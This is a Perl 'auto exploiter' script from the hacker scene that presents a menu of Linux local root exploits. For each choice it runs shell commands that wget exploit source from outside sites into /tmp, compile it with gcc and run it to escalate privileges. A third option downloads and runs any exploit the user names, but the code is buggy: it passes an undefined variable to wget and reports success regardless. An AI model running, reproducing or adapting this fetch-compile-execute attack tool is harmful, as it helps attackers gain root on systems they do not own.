#!/usr/bin/perl

print "=======================================\n";
print "| Auto ExpLoiT3r - Priv8 r00T Downl0aD |\n";
print "| Coder : SpyEyE - Family (WhoAmi)     |\n";
print "=======================================\n";

print "---------------------\n";
print " Menu:\n";
print " 1. h00lyshit.c\n";
print " 2. ImpelDown.c\n";
print " 3. Custom exploit\n";
print "---------------------\n";
$exploit = <STDIN>;
if ($exploit==1){&shit}
if ($exploit==2){&impel}
if ($exploit==3){&custom}

sub shit
{
print "[+] downloading h00lyshit.c...\n";
system ("cd /tmp/;mkdir exploits;chmod 777 exploits;cd exploits;wget www.xfocus.com/tools/200607/h00lyshit.c;chmod 777 h00lyshit.c;gcc h00lyshit.c -o h00lyshit;dd if=/dev/urandom of=largefile count=2M");
print "[+] executing h00lyshit...\n";
system ("./h00lyshit largefile");
print "[+] executed h00lyshit\n";
}

sub impel
{
print "[+] downloading ImpelDown.c...\n";
system ("cd /tmp/;mkdir exploits;chmod 777 exploits;cd exploits;wget www.packetstormsecurity.org/0911-exploits/ImpelDown.c;chmod 777 ImpelDown.c;gcc ImpelDown.c -o impeldown");
print "[+] executing ImpelDown...\n";
system ("./impeldown");
print "[+] executed ImpelDown\n";
}

sub custom
{
print "[+] site directory:\n";
$userdir = <STDIN>;
print "[+] localroot name:\n";
$localrootname = <STDIN>;
if (-x "/usr/bin/wget"){
system ("cd /tmp/;mkdir s0ra;chmod 777 s0ra;cd s0ra;wget $userinfo;chmod 777 $localrootname;./$localrootname");
print "[+] successfully executed custom exploit!\n";
system ("whoami");
}

}
